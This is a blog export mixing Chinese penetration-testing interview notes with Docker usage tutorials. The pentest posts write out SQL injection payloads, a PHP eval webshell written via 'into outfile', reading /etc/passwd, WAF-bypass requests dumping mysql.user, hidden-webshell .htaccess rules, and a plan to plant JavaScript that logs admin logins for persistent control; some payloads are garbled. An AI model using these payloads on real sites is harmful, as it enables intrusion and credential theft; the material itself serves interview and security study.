class="line"></span><br><span class="line">(nmap -sV -T4 -O -F --version-light)</span><br><span class="line"></span><br><span class="line">快速扫描加强模式</span><br><span class="line"></span><br><span class="line">-sV 探测端口及版本服务信息。</span><br><span class="line"></span><br><span class="line">-O 开启OS检测</span><br><span class="line"></span><br><span class="line">--version-light 设定侦测等级为2。</span><br><span class="line"></span><br><span class="line">第八种：Quick traceroute</span><br><span class="line"></span><br><span class="line">(nmap -sn --traceroute)</span><br><span class="line"></span><br><span class="line">路由跟踪</span><br><span class="line"></span><br><span class="line">-sn Ping扫描，关闭端口扫描</span><br><span class="line"></span><br><span class="line">-traceroute 显示本机到目标的路由跃点。</span><br><span class="line"></span><br><span class="line">第九种：Regular scan</span><br><span class="line"></span><br><span class="line">规则扫描</span><br><span class="line"></span><br><span class="line">第十种：Slow comprehensive scan</span><br><span class="line"></span><br><span class="line">(nmap -sS -sU -T4 -A -v -PE -PP -PS80,443,-PA3389,PU40125 -PY -g 53 --script all)</span><br><span class="line"></span><br><span class="line">慢速全面扫描。</span><br></pre></td></tr></table></figure>



<p><strong>16.sql 注入的几种类型？</strong></p>
<p>(1)报错注入</p>
<p>(2)bool 型注入</p>
<p>(3)延时注入</p>
<p>(4)宽字节注入</p>
<p><strong>17.报错注入的函数有哪些？</strong></p>
<p>(1)and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-</p>
<p>(2)通过 floor 报错 向下取整</p>
<p>(3)+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</p>
<p>4)geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));</p>
<p>(5)multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p>
<p>(5)polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p>
<p>(7)multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p>
<p>(8)linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p>
<p>(9)multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p>
<p>(10)exp()select from test where id=1 and exp(~(select * from(select </p>
<p>user())a));</p>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p>
<p><strong>18.延时注入如何来判断？</strong></p>
<p>(1)if(ascii(substr(“hello”, 1, 1))=104</p>
<p><strong>(2) sleep(5), 1)</strong></p>
<p><strong>19.盲注和延时注入的共同点？</strong></p>
<p>都是一个字符一个字符的判断</p>
<p><strong>20.如何拿一个网站的 webshell？</strong></p>
<p>上传，后台编辑模板，sql 注入写文件，命令执行，代码执行，一些已经爆出的 cms 漏洞，比如 dedecms 后台可以直接建立脚本文件，wordpress 上传插件包含脚本文件 zip 压缩包等</p>
<p><strong>21.sql 注入写文件都有哪些函数？</strong></p>
<p>(1)select ‘一句话’ into outfile ‘路径’</p>
<p>(2)select ‘一句话’ into dumpfile ‘路径’</p>
<p>(3) <code>select &#39;&lt;?php eval($_POST[1]) ?&gt;&#39; into dumpfile &#39;d:\wwwroot\baidu.com\nvhack.php&#39;;</code></p>
<p><strong>22.如何防止 CSRF?</strong></p>
<p>(1)验证 referer</p>
<p>(2)验证 token</p>
<p>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
<p><strong>23.owasp 漏洞都有哪些？</strong></p>
<p>(1)SQL 注入防护方法：</p>
<p>(2)失效的身份认证和会话管理</p>
<p>(3)跨站脚本攻击 XSS</p>
<p>(4)直接引用不安全的对象</p>
<p>(5)安全配置错误</p>
<p>(6)敏感信息泄露</p>
<p>(7)缺少功能级的访问控制</p>
<p>(8)跨站请求伪造 CSRF</p>
<p>(9)使用含有已知漏洞的组件</p>
<p>(1))未验证的重定向和转发</p>
<p><strong>24.SQL 注入防护方法？</strong></p>
<p>(1)使用安全的 API</p>
<p>(2)对输入的特殊字符进行 Escape 转义处理(3)使用白名单来规范化输入验证方法</p>
<p>(4)对客户端输入进行控制，不允许输入 SQL 注入相关的特殊字符</p>
<p>(5)服务器端在提交数据库进行 SQL 查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
<p><strong>25.代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
<p>(1)代码执行：</p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>(2)文件读取：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>(3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<p><strong>26.img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</strong></p>
<p>src 指定一个远程的脚本文件，获取 referer</p>
<p><strong>27.img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径?</strong></p>
<p>1,远程服务器修改 apache 配置文件，配置.jpg 文件以 php 方式来解析AddType application/x-httpd-php .jpg<code>&lt;img src=http://xss.tv/1.jpg&gt;</code> 会以 php 方式来解析</p>
<p><strong>28.怎么绕过 WAF 注入和上传以及 xss？</strong></p>
<p>(1)关键字可以用%（只限 IIS 系列），比如 select 可以 sel%e%ct。原理：网络层 waf 对 SEL%E%CT 进行 url 解码后变成 SEL%E%CT，匹配 select 失败，而进入 asp.dll 对 SEL%E%CT 进行 url 解码却变成 select。IIS 下的 asp.dll 文件在对 asp 文件后参数串进行 url 解码时，会直接过滤掉 09-0d（09 是 tab 键,0d是回车）、20（空格）、%(后两个字符有一个不是十六进制)字符。xss 也是同理。</p>
<p>(2)内联注释。安全狗不拦截，但是安全宝、加速乐、D 盾等，看到/!/就 Fack了，所以只限于安全狗。比如：/!select*/</p>
<p>(3)编码。这个方法对 waf 很有效果，因为一般 waf 会解码，但是我们利用这个特点，进行两次编码，他解了第一次但不会解第二次，就 bypass 了。腾讯waf、百度 waf 等等都可以这样 bypass 的</p>
<p>(4)绕过策略如：伪造搜索引擎早些版本的安全狗是有这个漏洞的，就是把 User-Agent 修改为搜索引擎</p>
<p>(5)插入关键目录 admin,dede,install 等目录绕过 360webscan360webscan脚本存在这个问题，就是判断是否为admin dede install 等目录，如果是则不做拦截</p>
<p>GET /pen/news.php?id=1 union select user,password from mysql.user</p>
<p>GET /pen/news.php/admin?id=1 union select user,password from mysql.user</p>
<p>GET /pen/admin/..\news.php?id=1 union select user,password from mysql.user</p>
<p>(6)multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数WAF。</p>
<p>(7)参数绕过，复制参数，id=1&amp;id=1用一些特殊字符代替空格，比如在 mysql 中%0a 是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在 sqlserver 中可以用/**/代替空格</p>
<p>(8)内联注释，文件上传，复制文件包一份再加一份在 form-data;后面增加一定的字符</p>
<p><strong>29.既然宽字节注入可以绕过单引号过滤，那么怎么来修复呢？</strong></p>
<p>宽字符：解 决方法：就是在初始化连接和字符集之后，使用 SET character_set_client=binary 来设定客户端的字符集是二进制的。修改Windows 下的 MySQL 配置文件一般是 my.ini，Linux 下的 MySQL 配置文件一般是 my.cnf，比如：mysql_query(“SETcharacter_set_client=binary”);。character_set_client 指定的是 SQL 语句的编码，如果设置为 binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。</p>
<p><strong>30.列举出 oracle 注入获取管理员权限提权典型漏洞？</strong></p>
<p>【漏洞名称】 </p>
<p>sys.dbms_export_extension.get_domain_index_metadata 提</p>
<p>升权限漏洞【影响平台】Oracle 8i / 9i / 10g / XE</p>
<p>【风险等级】高【攻击需求】较低权限账号</p>
<p>【造成危害】取得管理员权限</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试总结(一)</title>
    <url>/2019/12/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%B8%80)/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.mysql的网站注入，5.0以上和5.0一下有什么区别</strong></p>
<p>5.0一下没有information_shema这个系统表，无法列表名等，只能暴力跑表名 5.0一下多是但用户单操作等，5.0以上是多用户多操作。</p>
<p><strong>2.在渗透测试过程中，手机目标站注册人邮箱对我们有什么价值。</strong></p>
<p>1.社工库看看有什么线索，尝试撞库 2.邮箱丢到搜索引擎里看看 3.用搜索到的关联信息找到社交账号 4.再次使用社工库看看密码的使用习惯 5.生成密码字典爆破 6.观察浏览那些非大众的网站</p>
<p><strong>3.判断出CMS对渗透有什么意义</strong></p>
<p>查找网上已曝光的关于cms的漏洞 或者github上查看是否开源了源码白盒审计源码。</p>
<p><strong>4.一个成熟并且相对安全的CMS，渗透是扫目录的意义。</strong></p>
<p>1.扫描敏感文件，二级目录扫描。 2.站长的误操作：网站备份文件压缩，说明txt文件，二级目录可能存放其他的站点。</p>
<p><strong>5.常见的网站服务器容器</strong></p>
<p>IIS Apache Nginx Tomcat Weblogic Jboss</p>
<p><strong>6.mysql注入点，怎么样写入一句话，需要哪些条件。</strong></p>
<p>root 权限以及网站的绝对路径</p>
<p>load_file()读取文件操作：</p>
<p>知道文件的绝对路径 能够使用 union 查询 对web目录有写的权限</p>
<p>union select 1,load_file(‘/etc/passwd’),3,4,5#</p>
<p>select 1,load_file(0x2f6574632f706173737764),3,4,5#</p>
<p>路径没有加单引号的话必须转换十六进制 要是想省略单引号的话必须转换十六进制</p>
<p>into outfile 写入文件操作：</p>
<p>文件名必须是全路径(绝对路径) 用户必须有写文件的权限 没有对单引号’过滤</p>
<p><code>select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;C:/Windows/tmp/cmd.php&#39;</code></p>
<p><code>select &#39;&lt;?php @eval($_POST[&quot;admin&quot;]); ?&gt;&#39; into outfile &#39;C:/Windows/tmp/eval.php&#39;</code></p>
<p>路径里面两个反斜杠\可以换成一个正斜杠/</p>
<p>PHP语句没有单引号的话，必须转换成十六进制 要是想省略单引号’的话,必须转换成十六进制</p>
<p><strong>7.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
<p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、</p>
<p>程序版本、数据库类型、二级域名、防火墙、维护者信息另说…</p>
<p>8.<strong>目前已知哪些版本的容器有解析漏洞，具体举例?</strong></p>
<p>(1) IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp”是文件夹名</p>
<p>(2) IIS 7.0/7.5</p>
<p>默认 Fast-CGI 开启，直接在 url 中图片地址后面输入/1.php，会把正常图片</p>
<p>当成 php 解析</p>
<p>(3) Nginx</p>
<p>版本小于等于 0.8.37，利用方法和 IIS 7.0/7.5 一样，Fast-CGI 关闭情况下也</p>
<p>可利用。</p>
<p>空字节代码 xxx.jpg.php</p>
<p>(4)Apache</p>
<p>上传的文件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀</p>
<p>(6)lighttpd</p>
<p>xx.jpg/xx.php</p>
<p><strong>9.如何手工快速判断目标站是 windows 还是 linux 服务器？</strong></p>
<p>linux 大小写敏感,windows 大小写不敏感</p>
<p><strong>10.为何一个 mysql 数据库的站，只有一个 80 端口开放？</strong></p>
<p>(1)更改了端口，没有扫描出来</p>
<p>(2) 站库分离(3) 3306 端口不对外开放</p>
<p><strong>11.3389 无法连接的几种情况?</strong></p>
<p>(1)没开放 3389 端口</p>
<p>(2)端口被修改</p>
<p>(3) 防护拦截</p>
<p>(4)处于内网(需进行端口转发)</p>
<p><strong>12.如何突破注入时字符被转义？</strong></p>
<p>宽字符注入;hex 编码绕过</p>
<p><strong>13.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
<p>查看编辑器的名称版本,然后搜索公开的漏洞</p>
<p><strong>14.拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</strong></p>
<p>能做的事情很多，用隐藏网马来举例子：</p>
<p>插入<code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p>
<p>.jpg 文件会被解析成.php 文件</p>
<p><strong>15.注入漏洞只能查账号密码？</strong></p>
<p>可脱裤，可上传 webshell,可执行命令</p>
<p><strong>16.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
<p>是根据特征码，所以很好绕过</p>
<p><strong>17.access 扫出后缀为 asp 的数据库文件，访问乱码。如何实现到本地利用?</strong></p>
<p>迅雷下载，直接改后缀为.mdb</p>
<p><strong>18.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
<p>因为 exp 执行多半需要空格界定参数</p>
<p><strong>19.某服务器有站点 A,B 为何在 A 的后台添加 test 用户，访问 B 的后台。发现</strong></p>
<p><strong>也添加上了 test 用户？</strong></p>
<p>同数据库</p>
<p><strong>20.注入时可以不使用 and 或 or 或 xor，直接 order by 开始注入吗？</strong></p>
<p>and/or/xor，前面的 1=1、1=2 步骤只是为了判断是否为注入点，如果已经</p>
<p>确定是注入点那就可以省那步骤去</p>
<p><strong>21:某个防注入系统，在注入时会提示：统检测到你有非法注入的行为。已记录您的 ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id=15 提交内容:and 1=1 如何利用这个防注入系统拿 shell？</strong> </p>
<p>在 URL 里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件</p>
<p>了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
<p><strong>22.上传大马后访问乱码时，有哪些解决办法？</strong></p>
<p>浏览器中改编码</p>
<p><strong>23.审查上传点的元素有什么意义？</strong></p>
<p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就</p>
<p>能突破限制了</p>
<p><strong>24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，</strong></p>
<p><strong>你觉得这里怎样利用？</strong></p>
<p>先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
<p><strong>25.目标站发现某 txt 的下载地址为</strong></p>
<p><strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什</a></strong></p>
<p><strong>么思路？</strong></p>
<p>这就任意文件下载漏洞，在 file=后面尝试输入 index.php 下载他的首页文件，</p>
<p>然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和</p>
<p>数据库的地址。</p>
<p><strong>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和 admin 目录。请问你的想法是？</strong></p>
<p>直接在网站二级目录/abc/下扫描敏感文件及目录</p>
<p><strong>27.在有 shell 的情况下，如何使用 xss 实现对目标站的长久控制？</strong></p>
<p>（1)后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如</p>
<p>果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的</p>
<p>网站文件中。(此方法适合有价值并且需要深入控制权限的网络)</p>
<p>(2)在登录后才可以访问的文件中插入 XSS 脚本</p>
<p><strong>28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的</strong></p>
<p><strong>密码？</strong></p>
<p>审查元素 把密码处的 password 属性改成 text 就明文显示了</p>
<p><strong>29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403.什么原</strong></p>
<p><strong>因？</strong></p>
<p>原因很多，有可能 web 服务器配置把上传目录写死了不执行相应脚本，尝试</p>
<p>改后缀名绕过</p>
<p><strong>30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
<p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12 看</p>
<p>HTML 体部 比如护卫神就可以在名称那看到<code>&lt;hws&gt;内容&lt;hws&gt;</code></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker的一些使用</title>
    <url>/2019/12/20/Docker%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html" target="_blank" rel="noopener">Go 语言</a> 并遵从 Apache2.0 协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
<a id="more"></a>

<h3 id="run-创建一个新的容器并运行一个命令"><a href="#run-创建一个新的容器并运行一个命令" class="headerlink" title="run 创建一个新的容器并运行一个命令"></a>run 创建一个新的容器并运行一个命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-p: 端口映射，格式为：主机(宿主)端口:容器端口 </span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">--name=&quot;nginx-lb&quot;: 为容器指定一个名称；</span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line">-h &quot;mars&quot;: 指定容器的hostname；</span><br><span class="line">-e username=&quot;ritchie&quot;: 设置环境变量；</span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line">--cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行；</span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line">--net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line">--link=[]: 添加链接到另一个容器；</span><br><span class="line">--expose=[]: 开放一个端口或一组端口</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name mynginx -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -P -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -p 80:80 -v /data:/data -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash</span><br></pre></td></tr></table></figure>

<p>使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@melon:~$ docker run -it nginx:latest /bin/bash</span><br><span class="line">root@a25352c562:/#</span><br></pre></td></tr></table></figure>

<h3 id="start-stop-restart"><a href="#start-stop-restart" class="headerlink" title="start/stop/restart"></a>start/stop/restart</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start :启动一个或多少已经被停止的容器</span><br><span class="line">docker stop :停止一个运行中的容器</span><br><span class="line">docker restart :重启容器</span><br><span class="line">语法</span><br><span class="line">docker start [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker stop [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker restart [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">实例</span><br><span class="line">启动已被停止的容器myrunoob</span><br><span class="line">docker start myrunoob</span><br><span class="line">停止运行中的容器myrunoob</span><br><span class="line">docker stop myrunoob</span><br><span class="line">重启容器myrunoob</span><br><span class="line">docker restart myrunoob</span><br></pre></td></tr></table></figure>

<h3 id="rm-删除一个或多少容器"><a href="#rm-删除一个或多少容器" class="headerlink" title="rm 删除一个或多少容器"></a>rm 删除一个或多少容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-f :通过SIGKILL信号强制删除一个运行中的容器</span><br><span class="line">-l :移除容器间的网络连接，而非容器本身</span><br><span class="line">-v :-v 删除与容器关联的卷</span><br><span class="line">实例</span><br><span class="line">强制删除容器db01、db02</span><br><span class="line">docker rm -f db01 db02</span><br><span class="line">移除容器nginx01对容器db01的连接，连接名db</span><br><span class="line">docker rm -l db </span><br><span class="line">删除容器nginx01,并删除容器挂载的数据卷</span><br><span class="line">docker rm -v nginx01</span><br></pre></td></tr></table></figure>

<h3 id="exec-在运行的容器中执行命令"><a href="#exec-在运行的容器中执行命令" class="headerlink" title="exec 在运行的容器中执行命令"></a>exec 在运行的容器中执行命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-d :分离模式: 在后台运行</span><br><span class="line">-i :即使没有附加也保持STDIN 打开</span><br><span class="line">-t :分配一个伪终端</span><br><span class="line">实例</span><br><span class="line">在容器mynginx中以交互模式执行容器内/root/runoob.sh脚本</span><br><span class="line"></span><br><span class="line">runoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.sh</span><br><span class="line">http://www.runoob.com/</span><br><span class="line">在容器mynginx中开启一个交互模式的终端</span><br><span class="line">runoob@runoob:~$ docker exec -i -t  mynginx /bin/bash</span><br><span class="line">root@b1a0703e41e7:/#</span><br></pre></td></tr></table></figure>

<h3 id="ps-列出容器"><a href="#ps-列出容器" class="headerlink" title="ps  列出容器"></a>ps  列出容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker ps [OPTIONS]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :显示所有的容器，包括未运行的。</span><br><span class="line">-f :根据条件过滤显示的内容。</span><br><span class="line"></span><br><span class="line">--format :指定返回值的模板文件。</span><br><span class="line">-l :显示最近创建的容器。</span><br><span class="line">-n :列出最近创建的n个容器。</span><br><span class="line">--no-trunc :不截断输出。</span><br><span class="line">-q :静默模式，只显示容器编号。</span><br><span class="line">-s :显示总的文件大小。</span><br><span class="line">实例</span><br><span class="line">列出所有在运行的容器信息。</span><br><span class="line">runoob@runoob:~$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                ...  PORTS                    NAMES</span><br><span class="line">09b93464c2f7   nginx:latest   &quot;nginx -g &apos;daemon off&quot; ...  80/tcp, 443/tcp          myrunoob</span><br><span class="line">列出最近创建的5个容器信息。</span><br><span class="line">runoob@runoob:~$ docker ps -n 5</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                   CREATED           </span><br><span class="line">09b93464c2f7        nginx:latest        &quot;nginx -g &apos;daemon off&quot;    2 days ago   ...   </span><br><span class="line">列出所有创建的容器ID。</span><br><span class="line">runoob@melon:~$ docker ps -a -q</span><br><span class="line">a135ad1da351</span><br><span class="line">a1da31d5aw1d</span><br><span class="line">a31da15344ad</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Docker的可视化</title>
    <url>/2019/12/18/%E5%85%B3%E4%BA%8EDocker%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
    <content><![CDATA[<p>Docker 是一个<a href="https://baike.baidu.com/item/开源/246339" target="_blank" rel="noopener">开源</a>的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 <a href="https://baike.baidu.com/item/Linux" target="_blank" rel="noopener">Linux</a>或Windows 机器上，也可以实现<a href="https://baike.baidu.com/item/虚拟化/547949" target="_blank" rel="noopener">虚拟化</a>。容器是完全使用<a href="https://baike.baidu.com/item/沙箱/393318" target="_blank" rel="noopener">沙箱</a>机制，相互之间不会有任何接口。</p>
<a id="more"></a>

<h1 id="Docker可视化管理工具"><a href="#Docker可视化管理工具" class="headerlink" title="Docker可视化管理工具"></a>Docker可视化管理工具</h1><p>Docker常见的几款web工具：</p>
<ul>
<li>docker UI</li>
<li>shipyard</li>
<li>portainer</li>
</ul>
<p><strong>本次是在Centos7上安装portainer</strong><br>首先搜索一下Docker Hub上的portainer镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apaa4odfj317s0i3mz3.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apaa4odfj317s0i3mz3.jpg" alt="img"></a><br>然后下载官方portainer镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull portainer/portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbdqnw2j30ue04qq36.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbdqnw2j30ue04qq36.jpg" alt="img"></a><br>在后台运行portainer容器，端口映射成9000，–restart=always表示开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always --name portainer -v /var/run/docker.sock:/var/run/docker.sock -v /Users/lee/dev/docker_file/portainer/data:/data docker.io/portainer/portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbwfaknj317z02qdfy.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbwfaknj317z02qdfy.jpg" alt="img"></a><br><a href="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apeg4xyxj317t03ft8r.jpg" target="_blank" rel="noopener"><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apeg4xyxj317t03ft8r.jpg" alt="img"></a><br>启动成功，浏览器访问ip:9000，初次访问需要设置密码，8位以上<br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apeqzav0j31hc0scgnh.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apeqzav0j31hc0scgnh.jpg" alt="img"></a><br>然后选择Local(本地模式)<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apjkuqpzj31hc0scn0g.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apjkuqpzj31hc0scn0g.jpg" alt="img"></a><br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apkghmtbj31hc0scgog.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apkghmtbj31hc0scgog.jpg" alt="img"></a><br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apl30k8uj31hc0sc0vv.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apl30k8uj31hc0sc0vv.jpg" alt="img"></a><br>功能区<br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5appmkxx0j31hc0scdjr.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5appmkxx0j31hc0scdjr.jpg" alt="img"></a><br>我们可以在images功能处直接pull一个新镜像(必须是Docker Hub上有的)<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apst92gcj31hc0sctd4.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apst92gcj31hc0sctd4.jpg" alt="img"></a><br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apt4r0qqj31hc0sc79j.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apt4r0qqj31hc0sc79j.jpg" alt="img"></a><br>添加容器<br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5aptws77mj31hc0scadi.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5aptws77mj31hc0scadi.jpg" alt="img"></a><br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apud185pj31hc0sc442.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apud185pj31hc0sc442.jpg" alt="img"></a><br>可以将容器内的端口全部随机映射到本机，也可以手动添加需要映射的端口，本次是将容器的80端口映射到本机的8080端口<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apwr4faxj313x0aegmo.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apwr4faxj313x0aegmo.jpg" alt="img"></a><br>启动成功<br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apxivmzgj31hc0scwj8.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apxivmzgj31hc0scwj8.jpg" alt="img"></a><br><a 